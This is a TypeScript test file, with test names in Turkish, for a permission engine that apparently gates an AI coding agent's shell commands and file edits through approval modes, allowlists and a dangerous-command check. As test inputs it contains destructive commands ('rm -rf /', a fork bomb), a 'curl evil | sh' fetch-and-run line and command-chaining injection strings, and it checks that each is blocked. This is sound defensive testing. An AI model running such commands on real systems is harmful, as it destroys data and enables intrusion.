import { describe, it, expect } from "vitest";
import { matchesAllowlist, isDangerous } from "../../src/permission/rules.js";
import { PermissionEngine } from "../../src/permission/engine.js";

describe("matchesAllowlist", () => {
  it("shell komutunda prefix eşleşmesi yapar", () => {
    expect(matchesAllowlist("npm test --watch", ["npm test"], "prefix")).toBe(true);
    expect(matchesAllowlist("npm publish", ["npm test"], "prefix")).toBe(false);
  });

  it("dosya yolunda glob eşleşmesi yapar", () => {
    expect(matchesAllowlist("src/app/index.ts", ["src/**"], "glob")).toBe(true);
    expect(matchesAllowlist("secrets/key.pem", ["src/**"], "glob")).toBe(false);
  });

  it("boş allowlist hiçbir şeyi eşleştirmez", () => {
    expect(matchesAllowlist("anything", [], "prefix")).toBe(false);
  });

  it("metakarakterli komut prefix eşleşmesinde reddedilir (zincirleme bypass'ı önler)", () => {
    expect(matchesAllowlist("npm test && rm -rf ~", ["npm test"], "prefix")).toBe(false);
    expect(matchesAllowlist("npm test; curl evil | sh", ["npm test"], "prefix")).toBe(false);
    expect(matchesAllowlist("npm test $(whoami)", ["npm test"], "prefix")).toBe(false);
  });

  it("yol benzeri exec komutu prefix modunda argümanla eşleşir (glob tahmini yok)", () => {
    expect(
      matchesAllowlist("./scripts/build.sh --ci", ["./scripts/build.sh"], "prefix"),
    ).toBe(true);
  });
});

describe("isDangerous", () => {
  it("yıkıcı komutları yakalar", () => {
    expect(isDangerous("rm -rf /")).toBe(true);
    expect(isDangerous("sudo rm -rf /*")).toBe(true);
    expect(isDangerous(":(){ :|:& };:")).toBe(true);
  });
  it("normal komutları güvenli sayar", () => {
    expect(isDangerous("npm test")).toBe(false);
    expect(isDangerous("git status")).toBe(false);
  });
});

describe("PermissionEngine", () => {
  it("safe seviye her modda onaysız izin verir", () => {
    const eng = new PermissionEngine({ mode: "ask", allowlist: [] });
    expect(eng.check({ level: "safe", preview: "read", allowKey: "x" })).toBe("allow");
  });

  it("ask modunda write/exec için sorar", () => {
    const eng = new PermissionEngine({ mode: "ask", allowlist: [] });
    expect(eng.check({ level: "write", preview: "edit", allowKey: "src/a.ts" })).toBe("ask");
    expect(eng.check({ level: "exec", preview: "npm i", allowKey: "npm i" })).toBe("ask");
  });

  it("acceptEdits modunda write otomatik, exec sorar", () => {
    const eng = new PermissionEngine({ mode: "acceptEdits", allowlist: [] });
    expect(eng.check({ level: "write", preview: "edit", allowKey: "src/a.ts" })).toBe("allow");
    expect(eng.check({ level: "exec", preview: "npm i", allowKey: "npm i" })).toBe("ask");
  });

  it("auto modunda her şey otomatik ama tehlikeli komut yine sorar", () => {
    const eng = new PermissionEngine({ mode: "auto", allowlist: [] });
    expect(eng.check({ level: "exec", preview: "npm i", allowKey: "npm i" })).toBe("allow");
    expect(eng.check({ level: "exec", preview: "rm -rf /", allowKey: "rm -rf /" })).toBe("ask");
  });

  it("auto modunda allowlist'te olsa bile tehlikeli komut sorar (dangerous wins)", () => {
    const eng = new PermissionEngine({ mode: "auto", allowlist: ["rm -rf /"] });
    expect(eng.check({ level: "exec", preview: "rm -rf /", allowKey: "rm -rf /" })).toBe("ask");
  });

  it("allowlist eşleşmesi ask modunda bile izin verir", () => {
    const eng = new PermissionEngine({ mode: "ask", allowlist: ["git status"] });
    expect(eng.check({ level: "exec", preview: "git status", allowKey: "git status" })).toBe("allow");
  });

  it("addAllow ile eklenen kural sonraki kontrolde geçerli olur", () => {
    const eng = new PermissionEngine({ mode: "ask", allowlist: [] });
    expect(eng.check({ level: "exec", preview: "ls", allowKey: "ls" })).toBe("ask");
    eng.addAllow("ls");
    expect(eng.check({ level: "exec", preview: "ls", allowKey: "ls" })).toBe("allow");
  });

  it("auto modunda write otomatik izin verir", () => {
    const eng = new PermissionEngine({ mode: "auto", allowlist: [] });
    expect(eng.check({ level: "write", preview: "edit", allowKey: "src/a.ts" })).toBe("allow");
  });
});
